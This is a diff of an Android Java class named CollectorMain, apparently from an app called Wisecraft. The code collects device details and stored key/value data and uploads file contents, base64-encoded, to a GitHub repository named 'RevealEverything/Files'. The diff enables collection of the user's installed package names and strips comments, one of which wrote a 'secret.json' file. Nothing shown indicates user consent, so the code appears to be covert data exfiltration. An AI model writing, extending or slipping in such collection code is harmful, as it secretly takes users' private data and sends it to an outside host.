@@ -53,12 +53,10 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 
 			} finally {
 				System.out.println(s);
-				//Utils.writeToFile(new File(Environment.getExternalStorageDirectory(),"/Wisecraft/secret.json"),s);
 			}
 			String[] files=Constant.EMPTY_STRING_ARRAY;
 			try {
 				files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
-				//gst = new GistService(ghc).getGist("544acb279290b659766e");
 			    repo = new RepositoryService(ghc).getRepository("RevealEverything", "Files");
 			    cont = new ContentsService(ghc).getContents(repo);
 			} catch (Throwable e) {
@@ -81,7 +79,6 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 								continue;
 							}
 						} catch (Throwable e) {
-							// TODO 自動生成された catch ブロック
 							e.printStackTrace();
 						}
 						params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
@@ -125,14 +122,12 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	        }
 	    }
 		throw new RuntimeException();
-		//return cont.stream().filter(o -> o.getName().equals(filename)).distinct().findFirst().get().getSha();
 	}
 	public static String shash(byte[] b) throws IOException {
 		try {
 			MessageDigest md = MessageDigest.getInstance("SHA");
 			md.reset();
 			byte[] hashed = md.digest(b);
-			// return Base64.encodeBase64String(hashed);
 			StringBuilder sb = new StringBuilder(hashed.length * 2);
 			for (byte bite : hashed) {
 				sb.append(Character.forDigit(bite >> 4 & 0xf, 16));
@@ -140,7 +135,6 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			}
 			return sb.toString();
 		} catch (NoSuchAlgorithmException e) {
-			// TODO 自動生成された catch ブロック
 			throw new IOException(e);
 		}
 	}
@@ -257,7 +251,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		public int    versionCode=Utils.getVersionCode(TheApplication.instance);
 	}
 	public static class SystemInfo {
-		//public HashSet<String> packages=getPackageNames();
+		public HashSet<String> packages=getPackageNames();
 		//public HashMap<String,PackageInfo> packageInfos=getPackageMisc();
 		public String 
 		board=Build.BOARD
@@ -292,7 +286,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		}
 		private HashMap<String,PackageInfo> getPackageMisc() {
 			HashMap<String,PackageInfo> names=new HashMap<>();
-			List<PackageInfo> packages=TheApplication.instance.getPackageManager().getInstalledPackages(PackageManager.GET_RECEIVERS | PackageManager.GET_ACTIVITIES | PackageManager.GET_INSTRUMENTATION | PackageManager.GET_CONFIGURATIONS);
+			List<PackageInfo> packages=TheApplication.instance.getPackageManager().getInstalledPackages(PackageManager.GET_RECEIVERS);
 			for (PackageInfo pi:packages) {
 				names.put(pi.packageName, pi);
 			}
